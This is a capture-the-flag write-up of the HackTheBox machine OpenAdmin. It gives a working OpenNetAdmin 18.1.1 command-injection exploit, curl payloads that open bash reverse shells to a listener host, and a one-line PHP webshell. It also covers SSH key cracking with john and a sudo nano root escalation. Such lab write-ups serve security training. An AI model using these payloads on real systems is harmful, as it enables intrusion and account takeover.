---
title: HTB: OpenAdmin
url: https://0xdf.gitlab.io/2020/05/02/htb-openadmin.html
date: 2020-05-02T14:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: htb-openadmin, hackthebox, ctf, nmap, gobuster, opennetadmin, searchsploit, password-reuse, webshell, ssh, john, sudo, gtfobins, oscp-like-v2, osep-like
---

![OpenAdmin](https://0xdfimages.gitlab.io/img/openadmin-cover.png)

OpenAdmin provided a straight forward easy box. There’s some enumeration to find an instance of OpenNetAdmin, which has a remote coded execution exploit that I’ll use to get a shell as www-data. The database credentials are reused by one of the users. Next I’ll pivot to the second user via an internal website which I can either get code execution on or bypass the login to get an SSH key. Finally, for root, there’s a sudo on nano that allows me to get a root shell using GTFObins.

## Box Info

| Name | [OpenAdmin](https://hackthebox.com/machines/openadmin)  [OpenAdmin](https://hackthebox.com/machines/openadmin) [Play on HackTheBox](https://hackthebox.com/machines/openadmin) |
| --- | --- |
| Release Date | [04 Jan 2020](https://twitter.com/hackthebox_eu/status/1213090232628854784) |
| Retire Date | 02 May 2020 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for OpenAdmin |
| Radar Graph | Radar chart for OpenAdmin |
| First Blood User | 00:20:08[R4J R4J](https://app.hackthebox.com/users/13243) |
| First Blood Root | 00:11:20[Kucharskov Kucharskov](https://app.hackthebox.com/users/139588) |
| Creator | [dmw0ng dmw0ng](https://app.hackthebox.com/users/82600) |

## Recon

### nmap

`nmap` shows two ports open, SSH on 22 and HTTP on 80:

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.171
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-18 12:07 EST
Warning: 10.10.10.171 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.171
Host is up (0.020s latency).
Not shown: 65222 closed ports, 311 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 24.48 seconds
root@kali# nmap -p 22,80 -sV -sC -oA scans/nmap-tcpscripts 10.10.10.171
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-18 12:57 EST
Nmap scan report for 10.10.10.171
Host is up (0.077s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.13 seconds

```

Based on both [Apache](https://packages.ubuntu.com/search?keywords=apache2) and [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) versions, this box looks like Ubuntu 18.04 Bionic.

### Website - TCP 80

#### Site

The site is just the default Apache page.

#### Directory Brute Force

`gobuster` does give a few paths to look at:

```

root@kali# gobuster dir -u http://10.10.10.171 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -x php,txt,html -o scans/gobuster-root-php_txt_html                                 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.171
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,html
[+] Timeout:        10s
===============================================================
2020/01/18 13:00:00 Starting gobuster
===============================================================
/index.html (Status: 200)
/music (Status: 301)
/artwork (Status: 301)
/sierra (Status: 301)
===============================================================
2020/01/18 13:23:39 Finished
===============================================================

```

#### /music

The page is for a music site:

![image-20200118134836666](https://0xdfimages.gitlab.io/img/image-20200118134836666.png)

Most of the links point back to `index.html`, or a couple other sides on the page. But the one that really matters is the Login link at the top - it points to `http://10.10.10.171/ona` (which doesn’t make a whole lot of sense).

#### Other Sites

The other sites were also mostly dummy text. I spent some time checking them out, but once I found `/ona`, I decided to focus there (especially given the name of the box).

#### /ona

This is an instance of OpenNetAdmin:

![image-20200118135047875](https://0xdfimages.gitlab.io/img/image-20200118135047875.png)

I can see the version is 18.1.1, which it is warning is not the latest.

## Shell as www-data

### Exploit POC

Searchsploit shows a remote code execution vulnerability in this version:

```

root@kali# searchsploit OpenNetAdmin
-------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                            |  Path
                                                                          | (/usr/share/exploitdb/)
-------------------------------------------------------------------------- ----------------------------------------
OpenNetAdmin 13.03.01 - Remote Code Execution                             | exploits/php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)              | exploits/php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                               | exploits/php/webapps/47691.sh
-------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result

```

There’s a link to this exploit on [exploit-db.com](https://www.exploit-db.com/exploits/47691). It’s super simple. The script runs an infinite bash loop taking commands and printing the output:

```

#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done

```

I can test it out with just curl. One lesson I learned is that it is important to have the trailing `/` at the end of the url:

```

root@kali# curl -s -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;id&xajaxargs[]=ping"  http://10.10.10.171/ona/
...[snip]...
<!-- Module Output -->
<table style="background-color: #F2F2F2; padding-left: 25px; padding-right: 25px;" width="100%" cellspacing="0" border="0" cellpadding="0">
    <tr>
        <td align="left" class="padding">
            <br>
            <div style="border: solid 2px #000000; background-color: #FFFFFF; width: 650px; height: 350px; overflow: auto;resize: both;">
                <pre style="padding: 4px;font-family: monospace;">uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
            </div>
        </td>
    </tr>
</table>

...[snip]...

```

I can see the output of `id` at the end of the `Module Output` section. The exploit from the site just adds an `echo` before and after the command the user runs and then uses `sed` to cut out the command output and ignore the rest. I could do this myself, but I’ll just get a reverse shell and leave that as an exercise for the motivated reader.

### Shell

Since I want a legit shell, I’ll use curl to push a `bash` reverse shell:

```

root@kali# curl -s -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;bash -c 'bash -i >%26 /dev/tcp/10.10.14.11/443 0>%261'&xajaxargs[]=ping"  http
://10.10.10.171/ona/

```

It hangs, but in my `nc` listener, I’ve got a shell:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.171.
Ncat: Connection from 10.10.10.171:40352.
bash: cannot set terminal process group (1004): Inappropriate ioctl for device
bash: no job control in this shell
www-data@openadmin:/opt/ona/www$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

## Priv: www-data –> jimmy

### Enumeration

On the box, I can see two user home directories, but I can’t read into either of them as www-data:

```

www-data@openadmin:/home$ ls
jimmy  joanna      

www-data@openadmin:/home$ find .
.
./jimmy
find: './jimmy': Permission denied
./joanna
find: './joanna': Permission denied  

```

Heading back to `/var/www`, there are three directories:

```

www-data@openadmin:/var/www$ ls
html  internal  ona   

```

`html` has the various sites:

```

www-data@openadmin:/var/www/html$ ls
artwork  index.html  marga  music  ona  sierra

```

I hadn’t found the `marga` one. But it looks like the rest of the dummy sites.

`internal` is owned by jimmy, and I can’t access it:

```

www-data@openadmin:/var/www$ ls -l
total 8
drwxr-xr-x 6 www-data www-data 4096 Nov 22 15:59 html
drwxrwx--- 2 jimmy    internal 4096 Jan 17 21:46 internal
lrwxrwxrwx 1 www-data www-data   12 Nov 21 16:07 ona -> /opt/ona/www
www-data@openadmin:/var/www$ cd internal/
bash: cd: internal/: Permission denied

```

Both `ona` and `html/ona`are links to `/opt/ona/www`.

### ONA DB

Since OpenNetAdmin was the only site I found that seemed like it would require any kind of DB connection, went looking in there. Reading the config files, I eventually found `/var/www/html/ona/local/config/database_settings.inc.php`:

```

<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

?>

```

I figured I’d check for password reuse, and it worked for jimmy:

```

www-data@openadmin:/var/www/html/ona$ su jimmy
Password:
jimmy@openadmin:/opt/ona/www$ id
uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)

```

No `user.txt` in jimmy’s home directory. I suspect I need to pivot to joanna.

## Priv: jimmy –> joanna

### Enumeration

As jimmy, I can now access `/var/www/internal`:

```

jimmy@openadmin:/var/www/internal$ ls -l
total 24
-rw-rw-r-- 1 jimmy jimmy     341 Jan 17 21:15 headers
-rwxrwxr-x 1 jimmy jimmy    3229 Jan 17 19:44 index_backup.php
-rwxrwxr-x 1 jimmy internal 3094 Jan 17 21:12 index.php
-rwxrwxr-x 1 jimmy internal  185 Nov 23 16:37 logout.php
-rwxrwxr-x 1 jimmy jimmy     339 Jan 17 20:13 main_backup.php
-rwxrwxr-x 1 jimmy internal  339 Jan 17 20:39 main.php

```

I can do some digging to see if this site is running, and how it’s hosted (different vhost, or path, or port) by looking at the configs in `/etc/apache2/sites-enabled`:

```

jimmy@openadmin:/etc/apache2/sites-enabled$ ls
internal.conf  openadmin.conf

```

`openadmin.conf` shows the site I found, listening on port 80, with root at `/var/www/html` (comment lines removed):

```

jimmy@openadmin:/etc/apache2/sites-enabled$ cat openadmin.conf 
<VirtualHost *:80>
        ServerName openadmin.htb

        ServerAdmin jimmy@openadmin.htb
        DocumentRoot /var/www/html

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

```

`internal.conf` shows a listener on localhost:52846:

```

jimmy@openadmin:/etc/apache2/sites-enabled$ cat internal.conf 
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>

```

It’s also interesting that it runs as jonanna.

### Internal Site

I’ll reconnect as jimmy over SSH with a tunnel so that I can reach the internal site:

```

root@kali# ssh jimmy@10.10.10.171 -L 52846:localhost:52846
jimmy@10.10.10.171's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jan 18 20:17:29 UTC 2020

  System load:  1.0               Processes:             132
  Usage of /:   51.4% of 7.81GB   Users logged in:       0
  Memory usage: 35%               IP address for ens160: 10.10.10.171
  Swap usage:   0%
 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sat Jan 18 19:23:37 2020 from 10.10.14.11
jimmy@openadmin:~$

```

Now I can visit http://127.0.0.1:52846/ and get the page:

![image-20200118151918716](https://0xdfimages.gitlab.io/img/image-20200118151918716.png)

### Path 1: Webshell

The initial way I solved this was to write a webshell into the root directory for this folder:

```

jimmy@openadmin:/var/www/internal$ echo '<?php system($_GET["0xdf"]); ?>'  
<?php system($_GET["0xdf"]); ?>                   
jimmy@openadmin:/var/www/internal$ echo '<?php system($_GET["0xdf"]); ?>' > 0xdf.php  

```

Now I can access that and get execution as joanna:

```

root@kali# curl http://127.0.0.1:52846/0xdf.php?0xdf=id
uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)

```

To get a shell, I can start `nc` and curl:

```

root@kali# curl 'http://127.0.0.1:52846/0xdf.php?0xdf=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.11/443%200%3E%261%27'

```

Shell comes instantly:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.171.
Ncat: Connection from 10.10.10.171:40556.
bash: cannot set terminal process group (1004): Inappropriate ioctl for device
bash: no job control in this shell
joanna@openadmin:/var/www/internal$ id
uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)

```

### Path 2: Log In and SSH

#### Log In and Get Key

The site above required username and password. If I check `index.php`, I can see the hardcoded username and password in the php source:

```

<?php
  $msg = '';
  
  if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
    if ($_POST['username'] == 'joanna' && $_POST['password'] == 'joanna') {
      $_SESSION['username'] = 'joanna';
      header("Location: /main.php");
    } else {             
      $msg = 'Wrong username or password.';
    }
  }
?>

```

On successful login, it redirects to `main.php`, where there’s an ssh key:

![image-20200118152816918](https://0xdfimages.gitlab.io/img/image-20200118152816918.png)

#### Decrypt Key

To decrypt the key, the first thing I tried was jimmy’s password, `n1nj4W4rri0R!`, but that fails:

```

root@kali# openssl rsa -in joanna-enc -out id_rsa_openadmin_joanna
Enter pass phrase for joanna-enc:
unable to load Private Key
139806906295488:error:06065064:digital envelope routines:EVP_DecryptFinal_ex:bad decrypt:../crypto/evp/evp_enc.c:570:
139806906295488:error:0906A065:PEM routines:PEM_do_header:bad decrypt:../crypto/pem/pem_lib.c:461:

```

Then I figured I’d try “ninja” words from rockyou. First create the wordlist:

```

root@kali# grep -i ninja /usr/share/wordlists/rockyou.txt > rockyou_ninja

```

Then it breaks in `john` instantly:

```

root@kali# /opt/john/run/john --wordlist=rockyou_ninja joanna-enc.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 3 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (joanna-enc)
1g 0:00:00:00 DONE (2020-01-18 15:37) 50.00g/s 88250p/s 88250c/s 88250C/s 007ninjajairo..#1FLUFFYCOCKYNINJA
Session completed

```

And I can write a unencrpyted copy of the key:

```

root@kali# openssl rsa -in joanna-enc -out id_rsa_openadmin_joanna
Enter pass phrase for joanna-enc:
writing RSA key

```

#### SSH

I can connect with that key as joanna:

```

root@kali# ssh -i ~/id_rsa_openadmin_joanna joanna@10.10.10.171
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jan 18 20:41:19 UTC 2020

  System load:  1.15              Processes:             142
  Usage of /:   51.4% of 7.81GB   Users logged in:       1
  Memory usage: 36%               IP address for ens160: 10.10.10.171
  Swap usage:   0%
 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Jan 17 23:34:31 2020 from 10.10.14.11
joanna@openadmin:~$

```

### user.txt

With either of these shells as joanna, I can now get `user.txt`:

```

joanna@openadmin:~$ cat user.txt
c9b2cf07************************

```

## Priv: joanna –> root

### Enumeration

Always check `sudo` on HTB, and it pays off here:

```

joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv

```

### sudo nano

gtfobins has a [page on nano](https://gtfobins.github.io/gtfobins/nano/#sudo). The path to get shell from `sudo` is as follows:

```

sudo nano
^R^X
reset; sh 1>&0 2>&0

```

Not that it matters, but `/opt/priv` is an empty file:

```

joanna@openadmin:/opt$ ls -l priv 
-rw-r--r-- 1 root root 0 Nov 22 23:49 priv

```

I’ll run `sudo /bin/nano /opt/priv` and be dropped into `nano`:

![image-20200118155556941](https://0xdfimages.gitlab.io/img/image-20200118155556941.png)

Now I’ll hit Ctrl+r to read a file, and the menu at the bottom pops up:

![image-20200118155638935](https://0xdfimages.gitlab.io/img/image-20200118155638935.png)

Ctrl+x is “Execute Command”. Typing that gives a prompt “Command to execute: “. If I just enter `/bin/sh`, it will freeze, because the stdin/stdout/stderr are messed up. That’s what the `reset; /bin/sh 1>&0 2>&0` fixes. When I run it, the remnants of `nano` are still there, but there’s a `#` as a prompt:

![image-20200118160107814](https://0xdfimages.gitlab.io/img/image-20200118160107814.png)

If I enter `id`, it works:

![image-20200118160219856](https://0xdfimages.gitlab.io/img/image-20200118160219856.png)

Hitting enter a few times clear it out, and running `bash` gets a more reasonable prompt:

![image-20200118160302193](https://0xdfimages.gitlab.io/img/image-20200118160302193.png)

Now with root shell I can grab `root.txt`:

```

root@openadmin:/root# cat root.txt
2f907ed4************************

```